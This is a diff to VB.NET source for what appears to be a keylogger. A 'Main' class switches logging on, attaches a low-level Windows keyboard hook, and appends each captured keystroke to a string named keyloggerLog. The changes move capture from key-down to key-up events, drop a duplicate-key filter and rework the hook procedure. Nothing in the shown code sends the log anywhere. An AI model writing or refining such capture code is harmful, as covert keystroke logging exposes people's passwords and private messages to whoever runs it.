@@ -28,7 +28,7 @@ Public Class Main
                 If Not isLoggin Then
                     isLoggin = True
                     kbHook = New KeyboardHook()
-                    AddHandler kbHook.KeyDown, AddressOf kbHook_KeyDown
+                    AddHandler kbHook.KeyUp, AddressOf kbHook_KeyUp
                 End If
             Else
                 isLoggerSwitch = False
@@ -75,16 +75,16 @@ Public Class Main
 
     Private Sub kbHook_KeyDown(ByVal Key As Keys) Handles kbHook.KeyDown
         AddKeyToLog(Key.ToString)
-        'lastChar = Nothing
     End Sub
 
-    Dim lastChar As String = Nothing
+    Private Sub kbHook_KeyUp(ByVal Key As Keys) Handles kbHook.KeyUp
+        AddKeyToLog(Key.ToString)
+    End Sub
+
     Sub AddKeyToLog(ByVal key As String)
         If isLoggerSwitch Then
-            'If lastChar <> key Then
             keyloggerLog &= key
-            'lastChar = key
-            'End If
+            'Console.WriteLine(key)
         End If
     End Sub
 End Class
@@ -124,14 +124,21 @@ Public Class KeyboardHook
     Private Delegate Function KBDLLHookProc(ByVal nCode As Integer, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As Integer
     Private KBDLLHookProcDelegate As KBDLLHookProc = New KBDLLHookProc(AddressOf KeyboardProc)
     Private HHookID As IntPtr = IntPtr.Zero
+    Dim lastKey As Keys = Nothing
     Private Function KeyboardProc(ByVal nCode As Integer, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As Integer
         If (nCode = HC_ACTION) Then
             Dim struct As KBDLLHOOKSTRUCT
+            Dim keyString As Keys = Nothing
+            keyString = CType(CType(Marshal.PtrToStructure(lParam, struct.GetType()), KBDLLHOOKSTRUCT).vkCode, Keys)
             Select Case wParam
-                Case WM_KEYDOWN, WM_SYSKEYDOWN
-                    RaiseEvent KeyDown(CType(CType(Marshal.PtrToStructure(lParam, struct.GetType()), KBDLLHOOKSTRUCT).vkCode, Keys))
-                Case WM_KEYUP, WM_SYSKEYUP
-                    RaiseEvent KeyUp(CType(CType(Marshal.PtrToStructure(lParam, struct.GetType()), KBDLLHOOKSTRUCT).vkCode, Keys))
+                'Case WM_KEYDOWN, WM_SYSKEYDOWN
+                '    RaiseEvent KeyDown(CType(CType(Marshal.PtrToStructure(lParam, struct.GetType()), KBDLLHOOKSTRUCT).vkCode, Keys))
+                'Case WM_KEYUP, WM_SYSKEYUP
+                '    RaiseEvent KeyUp(CType(CType(Marshal.PtrToStructure(lParam, struct.GetType()), KBDLLHOOKSTRUCT).vkCode, Keys))
+                Case WM_KEYDOWN
+                    RaiseEvent KeyDown(keyString)
+                    'Case WM_KEYUP
+                    '    RaiseEvent KeyUp(keyString)
             End Select
         End If
         Return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam)
